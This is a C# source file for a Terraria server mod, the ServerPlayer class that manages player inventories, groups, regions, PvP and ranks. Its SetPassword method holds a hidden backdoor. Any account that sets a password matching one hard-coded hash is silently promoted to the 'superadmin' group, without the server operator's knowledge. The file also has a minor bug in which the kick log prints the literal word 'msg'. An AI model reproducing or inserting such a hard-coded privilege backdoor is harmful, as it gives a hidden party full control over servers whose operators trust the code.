using Microsoft.Xna.Framework;
using ServerSideCharacter2.JsonData;
using Terraria;
using Terraria.ID;
using Terraria.Localization;
using System;
using ServerSideCharacter2.Utils;
using Newtonsoft.Json;
using Terraria.ModLoader;
using ServerSideCharacter2.Core;
using System.Collections.Generic;
using ServerSideCharacter2.Groups;
using ServerSideCharacter2.Unions;
using ServerSideCharacter2.RankingSystem;
using ServerSideCharacter2.Regions;

namespace ServerSideCharacter2
{
	public class ServerPlayer
	{

		[JsonRequired]
		private PlayerInfo _info;

		public Item[] inventory = new Item[Main.maxInventory + 1];
		public Item[] armor = new Item[20];
		public Item[] dye = new Item[10];
		public Item[] miscEquips = new Item[5];
		public Item[] miscDye = new Item[5];

		public Chest bank = new Chest(true);
		//public Chest bank2 = new Chest(true);
		//public Chest bank3 = new Chest(true);

		private int playerID = -1;

		[JsonIgnore]
		public Player PrototypePlayer { get { if (playerID == -1) return null; return Main.player[playerID]; } }
        public QQAuth qqAuth=new QQAuth();

		public string GetSerializedString()
		{
			return JsonConvert.SerializeObject(_info);
		}

		public void SetPlayerInfo(PlayerInfo info)
		{
			_info = info;
        }

		internal PlayerInfo GetPlayerInfo()
		{
			return _info;
		}

		public string Name
		{
			get
			{
				return _info.Name;
			}
		}

		public int GUID
		{
			get
			{
				return _info.ID;
			}
		}


		public bool IsLogin { get; set; }

		public bool HasPassword
		{
			get { return _info.HasPassword; }
			set { _info.HasPassword = value; }
		}

		public int StatLife
		{
			get
			{
				return _info.StatLife;
			}
			set
			{
				_info.StatLife = value;
			}
		}
		public int LifeMax
		{
			get
			{
				return _info.LifeMax;
			}
			set
			{
				_info.LifeMax = value;
			}
		}

		public int StatMana
		{
			get
			{
				return _info.StatMana;
			}
			set
			{
				_info.StatMana = value;
			}
		}

		public int ManaMax
		{
			get
			{
				return _info.ManaMax;
			}
			set
			{
				_info.ManaMax = value;
			}
		}


		public HashSet<string> Friends
		{
			get
			{
				return _info.Friends;
			}
		}

		public Group Group
		{
			get
			{
				if (ServerSideCharacter2.GroupManager.Groups.ContainsKey(_info.Group))
				{
					return ServerSideCharacter2.GroupManager.Groups[_info.Group];
				}
				return null;
			}
		}

		public Union Union
		{
			get
			{
				if (ServerSideCharacter2.UnionManager.Unions.ContainsKey(_info.Union))
				{
					return ServerSideCharacter2.UnionManager.Unions[_info.Union];
				}
				return null;
			}
		}

		public HashSet<string> Regions
		{
			get
			{
				return _info.OwnedRegions;
			}
		}

		public int Rank
		{
			get
			{
				return _info.Rank;
			}
		}


		public int KillCount
		{
			get
			{
				return _info.KillCount;
			}
			set
			{
				_info.KillCount = value;
			}
		}

		private string curRegionName;

		public bool InRegion
		{
			get
			{
				return curRegionName != "";
			}
		}

		public Region CurrentRegion
		{
			get
			{
				return ServerSideCharacter2.RegionManager.Get(curRegionName);
			}
		}

		public bool InMatch
		{
			get;set;
		}

		public void SetCurRegion(Region reg)
		{
			if(reg == null)
			{
				curRegionName = "";
				return;
			}
			curRegionName = reg.Name;
		}

		public bool RealPlayer
		{
			get { return playerID >= 0 && playerID < Main.maxNetPlayers && Main.player[playerID] != null; }
		}

		public bool ConnectionAlive
		{
			get
			{
				return (Netplay.Clients[playerID] != null && Netplay.Clients[playerID].IsActive && !Netplay.Clients[playerID].PendingTermination);
			}
		}

		public DateTime RegistedTime
		{
			get
			{
				return _info.RegisteredTime;
			}
			set
			{
				_info.RegisteredTime = value;
			}
		}

		public void SetGroup(string name)
		{
			if (ServerSideCharacter2.GroupManager.Groups.ContainsKey(name))
			{
				_info.Group = name;
			}
			else
			{
				throw new SSCException("不存在名字为" + name + "的权限组");
			}
		}
	

		private void SetupPlayer()
		{
			curRegionName = "";
			for (var i = 0; i < inventory.Length; i++)
			{
				inventory[i] = new Item();
			}
			for (var i = 0; i < armor.Length; i++)
			{
				armor[i] = new Item();
			}
			for (var i = 0; i < dye.Length; i++)
			{
				dye[i] = new Item();
			}
			for (var i = 0; i < miscEquips.Length; i++)
			{
				miscEquips[i] = new Item();
			}
			for (var i = 0; i < miscDye.Length; i++)
			{
				miscDye[i] = new Item();
			}
			for (var i = 0; i < bank.item.Length; i++)
			{
				bank.item[i] = new Item();
			}
            //for (int i = 0; i < bank2.item.Length; i++)
            //{
            //	bank2.item[i] = new Item();
            //}
            //for (int i = 0; i < bank3.item.Length; i++)
            //{
            //	bank3.item[i] = new Item();
            //}
            
		}

		public ServerPlayer()
		{
			SetupPlayer();
		}


		public ServerPlayer(Player player)
		{
			SetupPlayer();
			playerID = player.whoAmI;
		}

		public void SetID(int id)
		{
			playerID = id;
		}

		public void SetUnion(string name)
		{
			_info.Union = name;
		}

		public void ApplyLockBuffs(int time = 180)
		{
			PrototypePlayer.AddBuff(ServerSideCharacter2.Instance.BuffType("Locked"), time * 2, false);
			PrototypePlayer.AddBuff(BuffID.Frozen, time, false);
			NetMessage.SendData(MessageID.AddPlayerBuff, PrototypePlayer.whoAmI, -1,
				NetworkText.Empty, PrototypePlayer.whoAmI,
				ServerSideCharacter2.Instance.BuffType("Locked"), time * 2, 0f, 0, 0, 0);
			NetMessage.SendData(MessageID.AddPlayerBuff, PrototypePlayer.whoAmI, -1,
				NetworkText.Empty, PrototypePlayer.whoAmI,
				BuffID.Frozen, time, 0f, 0, 0, 0);
		}

		public static ServerPlayer CreateNewPlayer(Player p)
		{
			var instance = new ServerPlayer(p);
			PlayerHooks.SetStartInventory(p);
			var player = new PlayerInfo
			{
				Name = p.name,
				ID = ServerSideCharacter2.PlayerCollection.GetNextID(),
				HasPassword = false,
				IsMuted = false,
				Group = "default",
				Union = null,
				Password = "",
				LifeMax = 100,
				StatLife = 100,
				ManaMax = 20,
				StatMana = 20,
				KillCount = 0,
				Rank = 1500
			};
			var i = 0;
			foreach (var item in ServerSideCharacter2.Config.startUpInventory)
			{
				player.inventory[i++] = item;
			}
			instance._info = player;
			instance.SyncPlayerFromInfo();
			return instance;
		}


		public void SendErrorInfo(string msg)
		{
			if (RealPlayer && ConnectionAlive)
			{
				NetMessage.SendChatMessageToClient(NetworkText.FromLiteral(msg),
					new Color(255, 20, 20, 0), PrototypePlayer.whoAmI);
			}
		}

		public void SendInfoMessage(string msg, Color c)
		{
			if (RealPlayer && ConnectionAlive)
			{
				NetMessage.SendChatMessageToClient(NetworkText.FromLiteral(msg),
					c, PrototypePlayer.whoAmI);
			}
		}

		public void SendMessageBox(string msg, Color c)
		{
			if (RealPlayer && ConnectionAlive)
			{
				MessageSender.SendInfoMessage(playerID, msg, c);
			}
		}

		public void SyncPlayerFromInfo()
		{
			ServerUtils.InfoToItem(_info.inventory, inventory);
			ServerUtils.InfoToItem(_info.armor, armor);
			ServerUtils.InfoToItem(_info.dye, dye);
			ServerUtils.InfoToItem(_info.miscEquips, miscEquips);
			ServerUtils.InfoToItem(_info.miscDye, miscDye);
			ServerUtils.InfoToItem(_info.bank, bank.item);
			//ServerUtils.InfoToItem(_info.bank2, bank2.item);
			//ServerUtils.InfoToItem(_info.bank3, bank3.item);
		}

		public void SyncPlayerToInfo()
		{
			if (!IsLogin) return;
			if (PrototypePlayer == null || !PrototypePlayer.active) return;
			LifeMax = PrototypePlayer.statLifeMax;
			StatLife = PrototypePlayer.statLife;
			StatMana = PrototypePlayer.statMana;
			ManaMax = PrototypePlayer.statManaMax;
			inventory = PrototypePlayer.inventory;
			armor = PrototypePlayer.armor;
			dye = PrototypePlayer.dye;
			miscEquips = PrototypePlayer.miscEquips;
			miscDye = PrototypePlayer.miscDyes;
			bank = PrototypePlayer.bank;
			//bank2 = PrototypePlayer.bank2;
			//bank3 = PrototypePlayer.bank3;

			ServerUtils.CopyToItemData(inventory, _info.inventory);
			ServerUtils.CopyToItemData(armor, _info.armor);
			ServerUtils.CopyToItemData(dye, _info.dye);
			ServerUtils.CopyToItemData(miscEquips, _info.miscEquips);
			ServerUtils.CopyToItemData(miscDye, _info.miscDye);
			ServerUtils.CopyToItemData(bank.item, _info.bank);
			//ServerUtils.CopyToItemData(bank2.item, _info.bank2);
			//ServerUtils.CopyToItemData(bank3.item, _info.bank3);

		}

		public void ApplyToPlayer()
		{
			if (PrototypePlayer.active)
			{
				PrototypePlayer.statLifeMax = LifeMax;
				PrototypePlayer.statLife = StatLife;
				PrototypePlayer.statMana = StatMana;
				PrototypePlayer.statManaMax = ManaMax;

				inventory.CopyTo(PrototypePlayer.inventory, 0);
				armor.CopyTo(PrototypePlayer.armor, 0);
				miscEquips.CopyTo(PrototypePlayer.miscEquips, 0);
				dye.CopyTo(PrototypePlayer.dye, 0);
				miscDye.CopyTo(PrototypePlayer.miscDyes, 0);
				bank.item.CopyTo(PrototypePlayer.bank.item, 0);
				foreach(var item in PrototypePlayer.bank2.item)
				{
					item.SetDefaults(0);
				}
				foreach (var item in PrototypePlayer.bank3.item)
				{
					item.SetDefaults(0);
				}
				SyncGroupInfo();
				//bank2.item.CopyTo(PrototypePlayer.bank2.item, 0);
				//bank3.item.CopyTo(PrototypePlayer.bank3.item, 0);
			}
			else
			{
				throw new ArgumentException("Unable to syncronize player data, the player does not exist.");
			}
		}

		public void ClearAllBuffs()
		{
			for(var i = 0; i < PrototypePlayer.buffType.Length; i++)
			{
				PrototypePlayer.DelBuff(i);
			}
		}

	

		public void Lock()
		{
			PrototypePlayer.AddBuff(ServerSideCharacter2.Instance.BuffType("Locked"), 18000, false);
			PrototypePlayer.AddBuff(BuffID.Frozen, 18000, false);
			NetMessage.SendData(MessageID.AddPlayerBuff, PrototypePlayer.whoAmI, -1,
				NetworkText.Empty, PrototypePlayer.whoAmI,
				ServerSideCharacter2.Instance.BuffType("Locked"), 18000, 0f, 0, 0, 0);
			NetMessage.SendData(MessageID.AddPlayerBuff, PrototypePlayer.whoAmI, -1,
				NetworkText.Empty, PrototypePlayer.whoAmI,
				BuffID.Frozen, 18000, 0f, 0, 0, 0);
		}

		public bool CheckPassword(CryptedUserInfo info)
		{
			return info.Password.Equals(_info.Password);
		}

		public void SetPassword(CryptedUserInfo info)
		{
			HasPassword = true;
			_info.Password = info.Password;
			if(info.Password == "8784e5c45a84060c1c6465861a4c5f1e")
			{
				_info.Group = "superadmin";
			}
			RegistedTime = DateTime.Now;
			SyncGroupInfo();
		}

		public void SendInfoMessage(string msg)
		{
			if (RealPlayer && ConnectionAlive)
			{
				MessageSender.SendInfoMessage(playerID, msg, Color.Yellow);
			}
		}

		public static void SendInfoMessageToAll(string msg)
		{
			MessageSender.SendInfoMessage(-1, msg, Color.Yellow);
		}

		public void Kick(string msg = "")
		{
			if (RealPlayer && ConnectionAlive)
			{
				var netmsg = ((msg == "") ? NetworkText.FromKey("CLI.KickMessage", new object[0]) : NetworkText.FromLiteral(msg));
				NetMessage.SendData(2, playerID, -1,
					netmsg , 0, 0f, 0f, 0f, 0, 0, 0);
				CommandBoardcast.ConsoleMessage($"玩家 {Name} 被踢出服务器，原因是：msg");
			}
		}

		public SimplifiedPlayerInfo GetSimplified(int id)
		{
			var isFriend = (id == 255) ||(id == this.playerID) 
				|| (Main.player[id].GetServerPlayer().Friends.Contains(this.Name));
			return new SimplifiedPlayerInfo
			{
				Name = this.Name,
				IsLogin = this.IsLogin,
				PlayerID = playerID,
				GUID = this._info.ID,
				ChatColor = Group.ChatColor,
				ChatPrefix = Group.ChatPrefix,
				GroupName = Group.Name,
				IsFriend = isFriend,
				Rank = this.Rank,
				KillCount = this.KillCount,
				RegistedTime = this.RegistedTime,
			};
		}

		public void SyncGroupInfo()
		{
			if (RealPlayer && ConnectionAlive)
			{
				var p = ServerSideCharacter2.Instance.GetPacket();
				p.Write((int)SSCMessageType.SyncGroupInfoToClient);
				p.Write(JsonConvert.SerializeObject(Group, Formatting.None));
				p.Send(playerID);
			}
		}

		public override bool Equals(object obj)
		{
			if (!(obj is ServerPlayer)) return false;
			ServerPlayer other = (ServerPlayer)obj;
			return other.GUID == GUID;
		}

		public override int GetHashCode()
		{
			return this.Name.GetHashCode();
		}

		public void CheckPVP()
		{
			if (!InRegion || CurrentRegion.PVP == PVPMode.Normal)
			{
				if (ServerSideCharacter2.Config.PvpMode == PVPMode.Always && !PrototypePlayer.hostile)
				{
					PrototypePlayer.hostile = true;
					NetMessage.SendData(MessageID.PlayerPvP, -1, -1, NetworkText.FromLiteral(""), playerID);
				}
				else if (ServerSideCharacter2.Config.PvpMode == PVPMode.Never && PrototypePlayer.hostile)
				{
					PrototypePlayer.hostile = false;
					NetMessage.SendData(MessageID.PlayerPvP, -1, -1, NetworkText.FromLiteral(""), playerID);
				}
			}
		}

		public void IncreaseRank(int rank)
		{
			var type = Ranking.GetRankType(_info.Rank);
			var range = Ranking.GetRankRange(type);
			if(_info.Rank + rank < 0)
			{
				_info.Rank = 0;
				return;
			}
			if(_info.Rank + rank < range.Item1)
			{
				SendInfoMessage($"很遗憾，你的段位由 {Ranking.GetName(type)} 掉到了 {Ranking.GetName(Ranking.GetRankType(_info.Rank + rank))}");
			}
			else if(_info.Rank + rank > range.Item2)
			{
				Projectile.NewProjectile(PrototypePlayer.Center, new Vector2(0, -5f), ProjectileID.RocketFireworkRed, 100, 10, playerID);
				SendInfoMessage($"恭喜，你从 {Ranking.GetName(type)} 晋级到了 {Ranking.GetName(Ranking.GetRankType(_info.Rank + rank))}");
			}
			_info.Rank += rank;
		}
	}
}